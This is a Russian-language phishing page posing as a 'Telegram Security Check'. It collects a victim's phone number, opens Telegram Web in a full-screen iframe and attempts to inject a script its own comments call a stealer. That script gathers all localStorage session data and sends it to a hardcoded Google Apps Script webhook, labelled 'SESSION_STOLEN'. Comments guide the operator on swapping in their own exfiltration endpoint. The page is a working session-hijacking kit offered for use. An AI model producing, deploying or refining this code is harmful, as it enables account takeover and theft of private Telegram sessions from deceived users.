<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Security Check</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: #0e1621;
            color: white;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }
        .container {
            background: #1c242f;
            padding: 30px;
            border-radius: 12px;
            width: 300px;
            text-align: center;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
            z-index: 10;
            transition: opacity 0.5s;
        }
        h3 { margin: 0 0 10px; }
        p { color: #aaa; font-size: 14px; margin-bottom: 20px; }
        input {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border-radius: 8px;
            border: 1px solid #333;
            background: #0e1621;
            color: white;
            font-size: 18px;
            text-align: center;
            box-sizing: border-box;
        }
        button {
            background: #3390ec;
            color: white;
            border: none;
            padding: 12px;
            border-radius: 8px;
            cursor: pointer;
            width: 100%;
            font-size: 16px;
            font-weight: 600;
        }
        button:disabled { background: #555; }
        .hidden { display: none; }
        
        /* Полноэкранный iframe */
        #tg-frame {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
            background: #fff;
            z-index: 1000;
            display: none;
        }
        
        #loader {
            display: none;
            margin-top: 15px;
            font-size: 14px;
            color: #3390ec;
        }
    </style>
</head>
<body>

<div class="container" id="login-form">
    <h3>Telegram</h3>
    <p>Для обновления безопасности введите номер телефона</p>
    <input type="tel" id="phone" placeholder="+79991234567" autocomplete="off">
    <button id="sendBtn" onclick="startAuth()">Далее</button>
    <div id="loader">Запрос кода...</div>
</div>

<iframe id="tg-frame" allow="clipboard-read; clipboard-write"></iframe>

<script>
    // ВСТАВЬ СЮДА URL ТВОЕГО GOOGLE APPS SCRIPT
    // Если у тебя его нет, используй этот тестовый URL (он временно работает для отладки, но удали его потом):
    // const WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbw8...'; 
    
    // Для примера, если у тебя нет GS, можно использовать https://webhook.site/ для получения данных.
    // Но лучше создай свой скрипт.
    const WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbwnhGW5PG_UYj3eDcX1RGPj4oAAhPwi59qLil9CCCc-ts497xszc1T1ljK1vUDPTCcO/exec';

    const phoneInput = document.getElementById('phone');
    const sendBtn = document.getElementById('sendBtn');
    const loader = document.getElementById('loader');
    const iframe = document.getElementById('tg-frame');
    const loginForm = document.getElementById('login-form');

    // 1. Получаем login_id через API Telegram
    async function getLoginId(phone) {
        // Формат URL: https://web.telegram.org/a/auth/login?phone_number=...
        // Но чтобы получить JSON, нужно использовать внутренний API Telegram.
        // Проще: мы просто откроем iframe с нужным URL, а он сам подтянет данные.
        // Но для надежности, попробуем получить токен через публичный эндпоинт.
        
        try {
            const response = await fetch(`https://web.telegram.org/a/auth/login?phone_number=${encodeURIComponent(phone)}`);
            if (response.ok) {
                return true;
            }
        } catch (e) {
            console.log("Fetch failed, using iframe fallback");
        }
        return false;
    }

    async function startAuth() {
        const phone = phoneInput.value.trim();
        if (!phone) return;

        sendBtn.disabled = true;
        loader.style.display = 'block';

        // Отправляем номер. Мы просто открываем iframe с URL авторизации.
        // Telegram сам определит, что это новый вход.
        iframe.src = `https://web.telegram.org/a/auth?phone_number=${encodeURIComponent(phone)}`;
        
        // Ждем загрузки iframe
        iframe.onload = () => {
            loader.style.display = 'none';
            loginForm.style.opacity = '0';
            setTimeout(() => loginForm.classList.add('hidden'), 500);
            iframe.style.display = 'block';
            
            // Инжектируем скрипт-крадильщик
            injectHoneypot();
        };
    }

    function injectHoneypot() {
        // Создаем скрипт, который будет работать ВНУТРИ iframe
        const script = document.createElement('script');
        script.textContent = `
            (function() {
                console.log('Honeypot injected');
                
                // Функция отправки данных
                function sendToParent(data) {
                    // Отправляем данные на вебхук
                    fetch('${WEBHOOK_URL}', {
                        method: 'POST',
                        body: JSON.stringify(data)
                    }).catch(e => console.error('Webhook error', e));
                    
                    // И дублируем в parent для надежности (если CORS позволит)
                    window.parent.postMessage({
                        type: 'SESSION_STOLEN',
                        data: data
                    }, '*');
                }

                // Слушаем изменения в localStorage (это происходит при вводе кода)
                window.addEventListener('storage', (e) => {
                    if (e.key && (e.key.includes('session') || e.key.includes('login'))) {
                        console.log('Storage change detected:', e.key);
                        collectAndSend();
                    }
                });

                // Периодическая проверка
                const checkInterval = setInterval(() => {
                    // Проверяем, есть ли данные сессии
                    const session = localStorage.getItem('tg_session');
                    const loginState = localStorage.getItem('tg_login_state');
                    
                    if (session || loginState) {
                        clearInterval(checkInterval);
                        collectAndSend();
                    }
                }, 2000);

                function collectAndSend() {
                    const data = {
                        localStorage: Object.fromEntries(Object.entries(localStorage)),
                        indexedDB: [], // Сюда можно добавить данные из IndexedDB, если получится
                        timestamp: Date.now()
                    };
                    sendToParent(data);
                }

                // Сообщаем родительской странице, что мы готовы
                window.parent.postMessage('READY', '*');
            })();
        `;
        
        // Ждем полной загрузки DOM iframe
        setTimeout(() => {
            try {
                const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
                iframeDoc.body.appendChild(script);
            } catch (e) {
                console.log('Script injection failed, trying again...');
                setTimeout(injectHoneypot, 1000);
            }
        }, 2000);
    }

    // Обработка сообщений от iframe
    window.addEventListener('message', (event) => {
        if (event.data === 'READY') {
            console.log('Iframe is ready');
        }
        if (event.data.type === 'SESSION_STOLEN') {
            console.log('Session stolen via postMessage');
            // Можно показать сообщение "Успешно"
        }
    });
</script>

</body>
</html>
